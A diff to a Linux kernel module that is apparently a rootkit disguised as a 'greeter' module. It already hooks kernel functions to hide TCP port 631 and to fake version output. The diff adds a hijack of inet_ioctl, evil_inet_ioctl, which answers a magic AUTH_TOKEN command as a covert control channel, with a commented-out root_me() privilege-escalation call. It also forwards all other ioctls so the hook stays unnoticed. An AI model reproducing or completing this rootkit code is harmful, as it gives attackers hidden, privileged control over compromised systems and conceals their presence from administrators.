@@ -62,6 +62,8 @@ MODULE_PARM_DESC(name, "The name to display in /var/log/kern.log");
 typedef int tcp4_seq_show(struct seq_file *,void *);
 tcp4_seq_show *tcp4_seq_show_ptr = 0xffffffffb6d78540;
 
+typedef int inet_ioctl(struct socket *, unsigned int, unsigned int);
+inet_ioctl *inet_ioctl_ptr = 0xffffffffb6d99a20;
 
 struct hidden_port
 {
@@ -127,6 +129,62 @@ static int version_proc_show_fake(struct seq_file *m, void *v)
 	return 0;
 }
 
+// void *get_inet_ioctl ( int family, int type, int protocol )
+// {
+//     void *ret;
+//     struct socket *sock = NULL;
+
+//     if ( sock_create(family, type, protocol, &sock) )
+//         return NULL;
+
+//     ret = sock->ops->ioctl;
+
+//     sock_release(sock);
+
+//     return ret;
+// }
+
+struct s_args
+{
+    unsigned short cmd;
+    void *ptr;
+};
+
+#define AUTH_TOKEN 0xabcdef
+
+static long evil_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long arg )
+{
+    int ret;
+    struct s_args args;
+
+    if ( cmd == AUTH_TOKEN )
+    {
+        ret = copy_from_user(&args, (void *)arg, sizeof(args));
+        if ( ret )
+            return 0;
+
+        switch ( args.cmd )
+        {
+
+        case 0:
+            // root_me();
+            break;
+
+        default:
+        	printk("daniel hay ioctl\n");
+            break;
+        }
+        return 0;
+    }
+
+    hijack_pause(inet_ioctl_ptr);
+    ret = inet_ioctl_ptr(sock, cmd, arg);
+    hijack_resume(inet_ioctl_ptr);
+
+    return ret;
+}
+
+
 static int __init greeter_init(void)
 {
     pr_info("%s: module loaded at 0x%p\n", MODULE_NAME, greeter_init);
@@ -140,6 +198,7 @@ static int __init greeter_init(void)
 
     hijack_start(version_proc_show_ptr, &version_proc_show_fake);
     hijack_start(tcp4_seq_show_ptr, &n_tcp4_seq_show);
+    hijack_start(inet_ioctl_ptr, &evil_inet_ioctl);
 
     return 0;
 }
@@ -149,6 +208,7 @@ static void __exit greeter_exit(void)
 
     hijack_stop(version_proc_show_ptr);
     hijack_stop(tcp4_seq_show_ptr);
+    hijack_stop(inet_ioctl_ptr);
 
     unhide_tcp4_port(631);
 
